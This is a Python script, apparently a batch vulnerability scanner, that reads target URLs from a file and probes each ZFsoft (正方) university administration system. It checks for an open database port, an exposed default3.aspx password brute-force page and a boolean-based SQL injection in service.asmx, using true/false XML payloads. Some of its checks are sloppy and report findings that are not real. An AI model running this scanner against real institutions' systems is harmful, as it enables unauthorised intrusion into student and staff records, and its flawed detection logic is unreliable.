
import re
import os
import sys
import requests
import socket
import warnings
from urllib.parse import urlparse


urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    port = 211
    if r"http" in url:
        # 提取host
        host = urlparse(url)[1]
        try:
            port = int(host.split(':')[1])
        except:
            pass
        flag = host.find(":")
        if flag != -1:
            host = host[:flag]
    else:
        if url.find(":") >= 0:
            host = url.split(":")[0]
            port = int(url.split(":")[1])
        else:
            host = url

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((host, port))
        print("[+]存在正方教务系统数据库任意操纵漏洞...(高危)\tpayload: " + host + ":" + str(port), "red")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    try:
        req = requests.get(url, timeout=6, verify=False, allow_redirects=True)
    except:
        pass
    tmpurl = str(req.url)
    tmpurl = tmpurl.lower()
    if r"default2.aspx" in tmpurl or r"default.aspx" in tmpurl:
        vulnurl = tmpurl.replace("default2.aspx", "").replace("default.aspx", "")
    else:
        vulnurl = tmpurl
    vulnurl = vulnurl + "default3.aspx"
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)
        if r"__VIEWSTATEGENERATOR" in req.text and r"CheckCode.aspx" not in req.text and req.status_code == 200:
            print("[+]存在正方教务系统default3.aspx爆破页面...(敏感信息)\tpayload: " + vulnurl, "green")
        else:
            print("[-]不存在zfsoft_default3_bruteforce漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/service.asmx"
    true_path = os.getcwd() + "/xml/zfsoft_service_stryhm_sqli_true.xml"
    false_path = os.getcwd() + "/xml/zfsoft_service_stryhm_sqli_false.xml"
    with open(true_path, "r") as f:
        post_data_true = f.read()
    with open(false_path, "r") as f:
        post_data_false = f.read()
    pattern = re.compile('<BMCheckPasswordResult xsi:type="xsd:int">[0-9]</BMCheckPasswordResult>')
    vulnurl = url + payload
    try:
        req1 = requests.post(vulnurl, data=post_data_true, timeout=10, verify=False)
        req2 = requests.post(vulnurl, data=post_data_false, timeout=10, verify=False)
        match1 = pattern.search(req1.text)
        match2 = pattern.search(req2.text)
        res_true = int(match1.group(0).replace('<BMCheckPasswordResult xsi:type="xsd:int">', '').replace(
            '</BMCheckPasswordResult>', ''))
        res_false = int(match2.group(0).replace('<BMCheckPasswordResult xsi:type="xsd:int">', '').replace(
            '</BMCheckPasswordResult>', ''))
        if res_true != res_false:
            print("[+]存在正方教务系统services.asmx SQL注入漏洞...(高危)\tpayload: " + vulnurl + "..[需要对比查看xml文件内容]", "red")
        else:
            print("[-]不存在zfsoft_service_stryhm_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")